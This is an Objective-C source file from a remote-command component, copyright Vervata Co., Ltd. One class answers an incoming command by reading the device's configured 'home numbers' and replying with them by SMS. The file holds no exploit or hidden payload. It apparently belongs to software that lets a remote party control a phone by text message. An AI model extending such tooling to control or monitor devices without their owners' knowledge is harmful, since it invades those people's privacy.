/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryHomesProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryHomesProcessor.h"
#import "PrefHomeNumber.h"
#import "Preference.h"

@interface QueryHomesProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryHomeNumber;
@end

@implementation QueryHomesProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryHomesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearHomesProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryHomesProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryHomesProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryHomesProcessor--->doProcessingCommand")
    [self processQueryHomeNumber];
}


#pragma mark QueryHomesProcessor  PrivateAPI

/**
 - Method name: processQueryHomeNumber
 - Purpose:This method is used to process query home number
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) processQueryHomeNumber {
	DLog (@"QueryHomesProcessor--->processQueryNotificationNumber")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	NSArray *homeNumberList=[prefHomeNumberList mHomeNumbers];
	NSString *result=NSLocalizedString(@"kQueryHomeNumber", @"");
	for (NSString *homeNumber in homeNumberList) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:homeNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryHomesProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryHomeMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryHomeMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryHomeMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end